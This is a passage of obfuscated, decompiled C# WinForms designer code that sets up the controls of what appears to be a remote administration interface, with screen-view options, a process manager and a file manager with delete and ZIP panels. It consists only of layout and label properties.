        this.vmethod_94().BackColor = Color.Transparent;
        this.vmethod_94().Enabled = false;
        this.vmethod_94().ForeColor = Color.Black;
        this.vmethod_94().Location = new Point(0x291, 0x19);
        this.vmethod_94().Margin = new Padding(2);
        this.vmethod_94().Name = "chkScreenMouseKeyboard";
        this.vmethod_94().Size = new Size(0x69, 0x11);
        this.vmethod_94().TabIndex = 0x11;
        this.vmethod_94().TabStop = false;
        this.vmethod_94().Text = "Clicks+Keyboard";
        this.vmethod_94().UseVisualStyleBackColor = false;
        this.vmethod_96().AutoSize = true;
        this.vmethod_96().BackColor = Color.Transparent;
        this.vmethod_96().Checked = true;
        this.vmethod_96().CheckState = CheckState.Checked;
        this.vmethod_96().Enabled = false;
        this.vmethod_96().ForeColor = Color.Black;
        this.vmethod_96().Location = new Point(0x291, 8);
        this.vmethod_96().Margin = new Padding(2);
        this.vmethod_96().Name = "chkScreenCursor";
        this.vmethod_96().Size = new Size(0x55, 0x11);
        this.vmethod_96().TabIndex = 0x10;
        this.vmethod_96().TabStop = false;
        this.vmethod_96().Text = "Show cursor";
        this.vmethod_96().UseVisualStyleBackColor = false;
        this.vmethod_92().AutoSize = true;
        this.vmethod_92().BackColor = Color.Transparent;
        this.vmethod_92().ForeColor = Color.Black;
        this.vmethod_92().Location = new Point(0x270, 7);
        this.vmethod_92().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_92().Name = "lblScreenQualityValue";
        this.vmethod_92().Size = new Size(0x1b, 13);
        this.vmethod_92().TabIndex = 15;
        this.vmethod_92().Text = "50%";
        this.vmethod_80().AutoSize = true;
        this.vmethod_80().BackColor = Color.Transparent;
        this.vmethod_80().ForeColor = Color.Black;
        this.vmethod_80().Location = new Point(0x1f5, 6);
        this.vmethod_80().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_80().Name = "lblScreenQuality";
        this.vmethod_80().Size = new Size(0x2a, 13);
        this.vmethod_80().TabIndex = 13;
        this.vmethod_80().Text = "Quality:";
        this.vmethod_82().BackColor = Color.White;
        this.vmethod_82().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_82().Enabled = false;
        this.vmethod_82().ForeColor = Color.Black;
        this.vmethod_82().FormattingEnabled = true;
        this.vmethod_82().Location = new Point(440, 8);
        this.vmethod_82().Margin = new Padding(2);
        this.vmethod_82().Name = "cbScreenSize";
        this.vmethod_82().Size = new Size(0x39, 0x15);
        this.vmethod_82().TabIndex = 12;
        this.vmethod_82().TabStop = false;
        this.vmethod_84().AutoSize = true;
        this.vmethod_84().BackColor = Color.Transparent;
        this.vmethod_84().ForeColor = Color.Black;
        this.vmethod_84().Location = new Point(0x19b, 11);
        this.vmethod_84().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_84().Name = "lblScreenSize";
        this.vmethod_84().Size = new Size(30, 13);
        this.vmethod_84().TabIndex = 11;
        this.vmethod_84().Text = "Size:";
        this.vmethod_88().BackColor = Color.White;
        this.vmethod_88().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_88().Enabled = false;
        this.vmethod_88().ForeColor = Color.Black;
        this.vmethod_88().FormattingEnabled = true;
        this.vmethod_88().Location = new Point(0x72, 8);
        this.vmethod_88().Margin = new Padding(2);
        this.vmethod_88().Name = "cbScreenMonitors";
        this.vmethod_88().Size = new Size(0xe7, 0x15);
        this.vmethod_88().TabIndex = 9;
        this.vmethod_88().TabStop = false;
        this.vmethod_90().AutoSize = true;
        this.vmethod_90().BackColor = Color.Transparent;
        this.vmethod_90().ForeColor = Color.Black;
        this.vmethod_90().Location = new Point(0x44, 12);
        this.vmethod_90().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_90().Name = "lblScreenDevice";
        this.vmethod_90().Size = new Size(0x2d, 13);
        this.vmethod_90().TabIndex = 8;
        this.vmethod_90().Text = "Monitor:";
        this.vmethod_32().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_32().Controls.Add(this.vmethod_508());
        this.vmethod_32().Controls.Add(this.vmethod_122());
        this.vmethod_32().Controls.Add(this.vmethod_120());
        this.vmethod_32().Controls.Add(this.vmethod_78());
        this.vmethod_32().ForeColor = Color.Black;
        this.vmethod_32().Location = new Point(4, 5);
        this.vmethod_32().Margin = new Padding(2);
        this.vmethod_32().Name = "tbProcesses";
        this.vmethod_32().Padding = new Padding(2);
        this.vmethod_32().Size = new Size(0x3d0, 0x221);
        this.vmethod_32().TabIndex = 2;
        this.vmethod_32().Text = "Processes";
        this.vmethod_508().set_BackColor(SystemColors.Control);
        this.vmethod_508().set_CircleWidth(20f);
        this.vmethod_508().set_GetAnimationColor(Color.DeepSkyBlue);
        this.vmethod_508().set_GetAnimationSpeed(100);
        this.vmethod_508().set_GetBaseColor(Color.SkyBlue);
        this.vmethod_508().Location = new Point(240, 0xb8);
        this.vmethod_508().MinimumSize = new Size(80, 80);
        this.vmethod_508().Name = "pbProcessesSplash";
        this.vmethod_508().set_NumberOfCircles(45f);
        this.vmethod_508().set_Radian(180.0);
        this.vmethod_508().Size = new Size(0xa1, 0xa1);
        this.vmethod_508().set_Smoothing(SmoothingMode.HighQuality);
        this.vmethod_508().TabIndex = 0x2e;
        this.vmethod_508().Visible = false;
        this.vmethod_122().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_122().AutoSize = false;
        this.vmethod_122().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_122().Dock = DockStyle.None;
        this.vmethod_122().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray8 = new ToolStripItem[] { this.vmethod_124(), this.vmethod_126(), this.vmethod_128(), this.vmethod_130(), this.vmethod_132(), this.vmethod_670(), this.vmethod_134() };
        this.vmethod_122().Items.AddRange(itemArray8);
        this.vmethod_122().Location = new Point(2, 0x20b);
        this.vmethod_122().Name = "ssProcessesStatus";
        this.vmethod_122().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_122().Size = new Size(0x3cc, 20);
        this.vmethod_122().SizingGrip = false;
        this.vmethod_122().Stretch = false;
        this.vmethod_122().TabIndex = 0x1c;
        this.vmethod_122().Text = "stStatus";
        this.vmethod_124().AutoSize = false;
        this.vmethod_124().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_124().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_124().Margin = new Padding(-1, 3, 0, 0);
        this.vmethod_124().Name = "tsProcessesCount";
        this.vmethod_124().Size = new Size(150, 0x11);
        this.vmethod_124().Text = "Processes: N/A";
        this.vmethod_124().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_126().AutoSize = false;
        this.vmethod_126().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_126().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_126().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_126().Name = "tsProcessesCPU";
        this.vmethod_126().Overflow = ToolStripItemOverflow.Never;
        this.vmethod_126().Size = new Size(150, 0x11);
        this.vmethod_126().Text = "CPU Usage: N/A";
        this.vmethod_126().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_128().AutoSize = false;
        this.vmethod_128().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_128().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_128().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_128().Name = "tsProcessesRAMSize";
        this.vmethod_128().Size = new Size(150, 0x11);
        this.vmethod_128().Text = "RAM Size: N/A";
        this.vmethod_128().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_130().AutoSize = false;
        this.vmethod_130().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_130().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_130().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_130().Name = "tsProcessesRAMFree";
        this.vmethod_130().Size = new Size(150, 0x11);
        this.vmethod_130().Text = "Free RAM: N/A";
        this.vmethod_130().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_132().AutoSize = false;
        this.vmethod_132().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_132().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_132().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_132().Name = "tsProcessesRAMLoad";
        this.vmethod_132().Size = new Size(150, 0x11);
        this.vmethod_132().Text = "RAM Load: N/A";
        this.vmethod_132().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_670().AutoSize = false;
        this.vmethod_670().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_670().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_670().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_670().Name = "tsProcessesSelected";
        this.vmethod_670().Size = new Size(0x89, 0x11);
        this.vmethod_670().Spring = true;
        this.vmethod_670().Text = "Selected: 0";
        this.vmethod_670().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_134().Alignment = ToolStripItemAlignment.Right;
        this.vmethod_134().ForeColor = Color.FromArgb(0xc0, 0xc0, 0);
        this.vmethod_134().Margin = new Padding(2, 3, -6, 2);
        this.vmethod_134().Maximum = 1;
        this.vmethod_134().Name = "tsProcessesProgress";
        this.vmethod_134().Size = new Size(0x52, 15);
        this.vmethod_134().Step = 1;
        this.vmethod_134().Style = ProgressBarStyle.Continuous;
        this.vmethod_34().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_34().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray9 = new ToolStripItem[10];
        itemArray9[0] = this.vmethod_36();
        itemArray9[1] = this.vmethod_38();
        itemArray9[2] = this.vmethod_40();
        itemArray9[3] = this.vmethod_42();
        itemArray9[4] = this.vmethod_44();
        itemArray9[5] = this.vmethod_50();
        itemArray9[6] = this.vmethod_64();
        itemArray9[7] = this.vmethod_46();
        itemArray9[8] = this.vmethod_66();
        itemArray9[9] = this.vmethod_48();
        this.vmethod_34().Items.AddRange(itemArray9);
        this.vmethod_34().Name = "cmsProcesses";
        this.vmethod_34().Size = new Size(170, 160);
        this.vmethod_36().Name = "RefreshProcessesToolStripMenuItem";
        this.vmethod_36().Size = new Size(0xa9, 0x16);
        this.vmethod_36().Text = "Refresh";
        this.vmethod_38().Name = "ToolStripMenuItem1";
        this.vmethod_38().Size = new Size(0xa6, 6);
        this.vmethod_40().Name = "SuspendToolStripMenuItem";
        this.vmethod_40().Size = new Size(0xa9, 0x16);
        this.vmethod_40().Text = "Suspend";
        this.vmethod_42().Name = "ResumeToolStripMenuItem";
        this.vmethod_42().Size = new Size(0xa9, 0x16);
        this.vmethod_42().Text = "Resume";
        this.vmethod_44().Name = "ToolStripMenuItem2";
        this.vmethod_44().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray10 = new ToolStripItem[] { this.vmethod_52(), this.vmethod_54(), this.vmethod_56(), this.vmethod_58(), this.vmethod_60(), this.vmethod_62() };
        this.vmethod_50().DropDownItems.AddRange(itemArray10);
        this.vmethod_50().Name = "PriorityToolStripMenuItem";
        this.vmethod_50().Size = new Size(0xa9, 0x16);
        this.vmethod_50().Text = "Priority";
        this.vmethod_52().Name = "RealtimeToolStripMenuItem";
        this.vmethod_52().Size = new Size(0x95, 0x16);
        this.vmethod_52().Text = "Realtime";
        this.vmethod_54().Name = "HighToolStripMenuItem";
        this.vmethod_54().Size = new Size(0x95, 0x16);
        this.vmethod_54().Text = "High";
        this.vmethod_56().Name = "AboveNormalToolStripMenuItem";
        this.vmethod_56().Size = new Size(0x95, 0x16);
        this.vmethod_56().Text = "Above normal";
        this.vmethod_58().Name = "NormalToolStripMenuItem";
        this.vmethod_58().Size = new Size(0x95, 0x16);
        this.vmethod_58().Text = "Normal";
        this.vmethod_60().Name = "BelowNormalToolStripMenuItem";
        this.vmethod_60().Size = new Size(0x95, 0x16);
        this.vmethod_60().Text = "Below normal";
        this.vmethod_62().Name = "LowToolStripMenuItem";
        this.vmethod_62().Size = new Size(0x95, 0x16);
        this.vmethod_62().Text = "Low";
        this.vmethod_64().Name = "ToolStripMenuItem3";
        this.vmethod_64().Size = new Size(0xa6, 6);
        this.vmethod_46().Name = "TerminateToolStripMenuItem";
        this.vmethod_46().Size = new Size(0xa9, 0x16);
        this.vmethod_46().Text = "Terminate";
        this.vmethod_66().Name = "ToolStripMenuItem4";
        this.vmethod_66().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray11 = new ToolStripItem[] { this.vmethod_434(), this.vmethod_436(), this.vmethod_438() };
        this.vmethod_48().DropDownItems.AddRange(itemArray11);
        this.vmethod_48().Name = "CopyToolStripMenuItem";
        this.vmethod_48().Size = new Size(0xa9, 0x16);
        this.vmethod_48().Text = "Copy to clipboard";
        this.vmethod_434().Name = "SelectedToolStripMenuItem1";
        this.vmethod_434().Size = new Size(0x76, 0x16);
        this.vmethod_434().Text = "Selected";
        this.vmethod_436().Name = "ToolStripMenuItem18";
        this.vmethod_436().Size = new Size(0x73, 6);
        this.vmethod_438().Name = "AllToolStripMenuItem";
        this.vmethod_438().Size = new Size(0x76, 0x16);
        this.vmethod_438().Text = "All";
        this.vmethod_70().BackColor = Color.Transparent;
        this.vmethod_70().Controls.Add(this.vmethod_696());
        this.vmethod_70().Controls.Add(this.vmethod_474());
        this.vmethod_70().Controls.Add(this.vmethod_454());
        this.vmethod_70().Controls.Add(this.vmethod_396());
        this.vmethod_70().Controls.Add(this.vmethod_204());
        this.vmethod_70().Controls.Add(this.vmethod_156());
        this.vmethod_70().Controls.Add(this.vmethod_518());
        this.vmethod_70().Controls.Add(this.vmethod_472());
        this.vmethod_70().Controls.Add(this.vmethod_452());
        this.vmethod_70().Controls.Add(this.vmethod_450());
        this.vmethod_70().Controls.Add(this.vmethod_448());
        this.vmethod_70().Controls.Add(this.vmethod_446());
        this.vmethod_70().Controls.Add(this.vmethod_76());
        this.vmethod_70().Controls.Add(this.vmethod_720());
        this.vmethod_70().ForeColor = Color.Black;
        this.vmethod_70().Location = new Point(4, 5);
        this.vmethod_70().Margin = new Padding(2);
        this.vmethod_70().Name = "tbFiles";
        this.vmethod_70().Padding = new Padding(2);
        this.vmethod_70().Size = new Size(0x3d0, 0x221);
        this.vmethod_70().TabIndex = 3;
        this.vmethod_70().Text = "Files";
        this.vmethod_696().Anchor = AnchorStyles.Right | AnchorStyles.Top;
        this.vmethod_696().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_696().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_696().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_696().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_696().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_696().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_696().Border.HoverVisible = true;
        this.vmethod_696().Border.Rounding = 6;
        this.vmethod_696().Border.Thickness = 1;
        this.vmethod_696().Border.Type = ShapeTypes.Rounded;
        this.vmethod_696().Border.Visible = true;
        this.vmethod_696().DialogResult = DialogResult.None;
        this.vmethod_696().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_696().Image = null;
        this.vmethod_696().Location = new Point(0x387, 6);
        this.vmethod_696().MouseState = MouseStates.Normal;
        this.vmethod_696().Name = "btnFilemanagerDrives";
        this.vmethod_696().Size = new Size(0x44, 0x15);
        this.vmethod_696().TabIndex = 0x29;
        this.vmethod_696().Text = "Refresh";
        this.vmethod_696().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_696().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_696().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_696().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_696().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_696().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_696().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_696().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_474().set_BackColor(SystemColors.Window);
        this.vmethod_474().set_CircleWidth(20f);
        this.vmethod_474().set_GetAnimationColor(Color.DeepSkyBlue);
        this.vmethod_474().set_GetAnimationSpeed(100);
        this.vmethod_474().set_GetBaseColor(Color.SkyBlue);
        this.vmethod_474().Location = new Point(0x195, 200);
        this.vmethod_474().MinimumSize = new Size(80, 80);
        this.vmethod_474().Name = "pbFilemanagerSplash";
        this.vmethod_474().set_NumberOfCircles(45f);
        this.vmethod_474().set_Radian(180.0);
        this.vmethod_474().Size = new Size(0xa1, 0xa1);
        this.vmethod_474().set_Smoothing(SmoothingMode.HighQuality);
        this.vmethod_474().TabIndex = 0x2d;
        this.vmethod_474().Visible = false;
        this.vmethod_454().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Top;
        this.vmethod_454().DrawMode = DrawMode.OwnerDrawVariable;
        this.vmethod_454().DropDownHeight = 250;
        this.vmethod_454().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_454().Enabled = false;
        this.vmethod_454().FormattingEnabled = true;
        this.vmethod_454().IntegralHeight = false;
        this.vmethod_454().Location = new Point(0xe9, 6);
        this.vmethod_454().Margin = new Padding(2);
        this.vmethod_454().MaxDropDownItems = 10;
        this.vmethod_454().Name = "cbFilemanagerDrive";
        this.vmethod_454().Size = new Size(0x29c, 0x15);
        this.vmethod_454().TabIndex = 0x29;
        this.vmethod_396().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_396().AutoSize = false;
        this.vmethod_396().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_396().Dock = DockStyle.None;
        this.vmethod_396().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray12 = new ToolStripItem[] { this.vmethod_398(), this.vmethod_400(), this.vmethod_402(), this.vmethod_404(), this.vmethod_406(), this.vmethod_444(), this.vmethod_408() };
        this.vmethod_396().Items.AddRange(itemArray12);
        this.vmethod_396().Location = new Point(2, 0x20b);
        this.vmethod_396().Name = "ssFilemanagerStatus";
        this.vmethod_396().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_396().Size = new Size(0x3cc, 20);
        this.vmethod_396().SizingGrip = false;
        this.vmethod_396().Stretch = false;
        this.vmethod_396().TabIndex = 0x24;
        this.vmethod_396().Text = "stStatus";
        this.vmethod_398().AutoSize = false;
        this.vmethod_398().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_398().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_398().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_398().Name = "tsFilemanagerPath";
        this.vmethod_398().Size = new Size(0x15a, 0x11);
        this.vmethod_398().Spring = true;
        this.vmethod_398().Text = "Path: N/A";
        this.vmethod_398().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_400().AutoSize = false;
        this.vmethod_400().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_400().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_400().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_400().Name = "tsFilemanagerDirs";
        this.vmethod_400().Overflow = ToolStripItemOverflow.Never;
        this.vmethod_400().Size = new Size(100, 0x11);
        this.vmethod_400().Text = "Dirs:  N/A";
        this.vmethod_400().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_402().AutoSize = false;
        this.vmethod_402().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_402().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_402().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_402().Name = "tsFilemanagerFiles";
        this.vmethod_402().Size = new Size(100, 0x11);
        this.vmethod_402().Text = "Files:  N/A";
        this.vmethod_402().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_404().AutoSize = false;
        this.vmethod_404().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_404().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_404().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_404().Name = "tsFilemanagerObjects";
        this.vmethod_404().Size = new Size(120, 0x11);
        this.vmethod_404().Text = "Objects: N/A";
        this.vmethod_404().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_406().AutoSize = false;
        this.vmethod_406().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_406().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_406().Font = new Font("Segoe UI", 9f);
        this.vmethod_406().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_406().Name = "tsFilemanagerSize";
        this.vmethod_406().Size = new Size(100, 0x11);
        this.vmethod_406().Text = "Size: N/A";
        this.vmethod_406().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_444().AutoSize = false;
        this.vmethod_444().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_444().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_444().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_444().Name = "tsFilemanagerSelectedObjects";
        this.vmethod_444().Size = new Size(120, 0x11);
        this.vmethod_444().Text = "Selected: N/A";
        this.vmethod_444().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_408().Alignment = ToolStripItemAlignment.Right;
        this.vmethod_408().ForeColor = Color.SkyBlue;
        this.vmethod_408().Margin = new Padding(2, 3, -6, 2);
        this.vmethod_408().Maximum = 1;
        this.vmethod_408().Name = "tsFilemanagerProgress";
        this.vmethod_408().Size = new Size(0x52, 15);
        this.vmethod_408().Step = 1;
        this.vmethod_408().Style = ProgressBarStyle.Continuous;
        this.vmethod_204().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_204().BorderStyle = BorderStyle.FixedSingle;
        this.vmethod_204().Controls.Add(this.vmethod_698());
        this.vmethod_204().Controls.Add(this.vmethod_206());
        this.vmethod_204().Controls.Add(this.vmethod_208());
        this.vmethod_204().Controls.Add(this.vmethod_210());
        this.vmethod_204().Controls.Add(this.vmethod_212());
        this.vmethod_204().Controls.Add(this.vmethod_214());
        this.vmethod_204().Location = new Point(0x1ff, 0x160);
        this.vmethod_204().Margin = new Padding(2);
        this.vmethod_204().Name = "pnlFilemanagerDelete";
        this.vmethod_204().Size = new Size(0x1bf, 0x49);
        this.vmethod_204().TabIndex = 0x22;
        this.vmethod_204().Visible = false;
        this.vmethod_698().Anchor = AnchorStyles.Right | AnchorStyles.Top;
        this.vmethod_698().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_698().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_698().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_698().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_698().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_698().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_698().Border.HoverVisible = true;
        this.vmethod_698().Border.Rounding = 6;
        this.vmethod_698().Border.Thickness = 1;
        this.vmethod_698().Border.Type = ShapeTypes.Rounded;
        this.vmethod_698().Border.Visible = true;
        this.vmethod_698().DialogResult = DialogResult.None;
        this.vmethod_698().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_698().Image = null;
        this.vmethod_698().Location = new Point(0x1ab, 3);
        this.vmethod_698().MouseState = MouseStates.Normal;
        this.vmethod_698().Name = "btnFilemanagerDeleteClose";
        this.vmethod_698().Size = new Size(15, 0x10);
        this.vmethod_698().TabIndex = 0x2a;
        this.vmethod_698().Text = "X";
        this.vmethod_698().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_698().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_698().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_698().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_698().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_698().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_698().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_698().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_206().BackColor = Color.Transparent;
        this.vmethod_206().Location = new Point(0x15b, 0x37);
        this.vmethod_206().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_206().Name = "lblFilemanagerDeleteCurrentfile";
        this.vmethod_206().RightToLeft = RightToLeft.Yes;
        this.vmethod_206().Size = new Size(0x60, 13);
        this.vmethod_206().TabIndex = 0x12;
        this.vmethod_206().Text = "N/A";
        this.vmethod_208().BackColor = Color.Transparent;
        this.vmethod_208().Location = new Point(5, 0x13);
        this.vmethod_208().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_208().Name = "lblFilemanagerDeleteCurrent";
        this.vmethod_208().Size = new Size(0x1b5, 0x22);
        this.vmethod_208().TabIndex = 3;
        this.vmethod_208().Text = "Current: N/A";
        this.vmethod_208().TextAlign = ContentAlignment.TopCenter;
        this.vmethod_210().AutoSize = true;
        this.vmethod_210().BackColor = Color.Transparent;
        this.vmethod_210().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, 0);
        this.vmethod_210().Location = new Point(0xb5, 2);
        this.vmethod_210().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_210().Name = "lblFilemanagerDeleteTitle";
        this.vmethod_210().Size = new Size(0x5d, 13);
        this.vmethod_210().TabIndex = 2;
        this.vmethod_210().Text = "Deleting files...";
        this.vmethod_212().AutoSize = true;
        this.vmethod_212().BackColor = Color.Transparent;
        this.vmethod_212().Location = new Point(2, 0x37);
        this.vmethod_212().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_212().Name = "lblFilemanagerDeleteProgress";
        this.vmethod_212().Size = new Size(0x33, 13);
        this.vmethod_212().TabIndex = 1;
        this.vmethod_212().Text = "Progress:";
        this.vmethod_214().set_AnimationInterval(100);
        this.vmethod_214().set_AutoAnimate(false);
        this.vmethod_214().set_BackColor(Color.White);
        this.vmethod_214().set_BorderColor(Color.Black);
        this.vmethod_214().set_BorderType(1);
        this.vmethod_214().set_ColorProgress(Color.Blue);
        this.vmethod_214().set_DisplayProgress(true);
        this.vmethod_214().set_ForeColor(Color.White);
        this.vmethod_214().Location = new Point(0x39, 0x37);
        this.vmethod_214().Margin = new Padding(2);
        this.vmethod_214().set_Maximum(100);
        this.vmethod_214().set_Minimum(0);
        this.vmethod_214().Name = "pbFilemanagerDelete";
        this.vmethod_214().set_RollBlockPercent(20);
        this.vmethod_214().set_RollingType(0);
        this.vmethod_214().set_RollTimer(200);
        this.vmethod_214().Size = new Size(0x11e, 13);
        this.vmethod_214().set_Step(5);
        this.vmethod_214().TabIndex = 0;
        this.vmethod_214().set_TextAlign(0);
        this.vmethod_214().set_TextColorType(1);
        this.vmethod_214().set_Value(0);
        this.vmethod_156().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_156().BorderStyle = BorderStyle.FixedSingle;
        this.vmethod_156().Controls.Add(this.vmethod_700());
        this.vmethod_156().Controls.Add(this.vmethod_166());
        this.vmethod_156().Controls.Add(this.vmethod_164());
        this.vmethod_156().Controls.Add(this.vmethod_162());
        this.vmethod_156().Controls.Add(this.vmethod_158());
        this.vmethod_156().Controls.Add(this.vmethod_160());
        this.vmethod_156().Location = new Point(0x1ff, 0x1ac);
        this.vmethod_156().Margin = new Padding(2);
        this.vmethod_156().Name = "pnlFilemanagerZIP";
        this.vmethod_156().Size = new Size(0x1bf, 0x49);
        this.vmethod_156().TabIndex = 0x21;
        this.vmethod_156().Visible = false;
        this.vmethod_700().Anchor = AnchorStyles.Right | AnchorStyles.Top;
        this.vmethod_700().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_700().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_700().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_700().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_700().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_700().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_700().Border.HoverVisible = true;
        this.vmethod_700().Border.Rounding = 6;
        this.vmethod_700().Border.Thickness = 1;
        this.vmethod_700().Border.Type = ShapeTypes.Rounded;
        this.vmethod_700().Border.Visible = true;
        this.vmethod_700().DialogResult = DialogResult.None;
        this.vmethod_700().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_700().Image = null;
        this.vmethod_700().Location = new Point(0x1ab, 3);
        this.vmethod_700().MouseState = MouseStates.Normal;
        this.vmethod_700().Name = "btnFilemanagerZIPClose";
        this.vmethod_700().Size = new Size(15, 0x10);
        this.vmethod_700().TabIndex = 0x2b;
        this.vmethod_700().Text = "X";
        this.vmethod_700().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_700().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_700().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_700().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_700().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_700().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_700().TextStyle.TextLineAlignment = StringAlignment.Center;
